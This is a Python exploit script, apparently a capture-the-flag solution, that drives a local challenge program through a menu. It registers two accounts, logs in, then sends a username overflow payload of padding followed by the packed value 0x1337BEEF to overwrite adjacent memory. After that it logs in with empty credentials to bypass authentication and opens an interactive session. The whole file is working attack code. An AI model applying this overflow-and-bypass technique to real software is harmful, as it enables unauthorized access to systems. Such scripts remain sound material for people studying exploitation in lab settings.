import interact
import struct

# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]
    
# Pack integer 'n' into a 4-Byte representation (little-endian)
def p32(n):
    return struct.pack('I', n)

p = interact.Process()

print(p.readuntil('Choice:'))
p.sendline('2')
print(p.readuntil('Username:'))
p.sendline('a')
print(p.readuntil('Password:'))
p.sendline('A'*8)
print(p.readuntil('Password:'))
p.sendline('A'*8)

print(p.readuntil('Choice:'))
p.sendline('2')
print(p.readuntil('Username:'))
p.sendline('b')
print(p.readuntil('Password:'))
p.sendline('B'*8)
print(p.readuntil('Password:'))
p.sendline('B'*8)

print(p.readuntil('Choice:'))
p.sendline('1')
print(p.readuntil('Username:'))
p.sendline('a')
print(p.readuntil('Password:'))
p.sendline('A'*8)

print(p.readuntil('Choice:'))
p.sendline('4')
print(p.readuntil('Username:'))
payload = 'A'*16 + 'B'*12 + p32(0x1337BEEF)
p.sendline(payload)

print(p.readuntil('Choice:'))
p.sendline('5')
print(p.readuntil('Choice:'))
p.sendline('1')
print(p.readuntil('Username:'))
p.sendline('')
print(p.readuntil('Password:'))
p.sendline('')
print(p.readuntil('Choice:'))
p.sendline('6')

p.interactive()
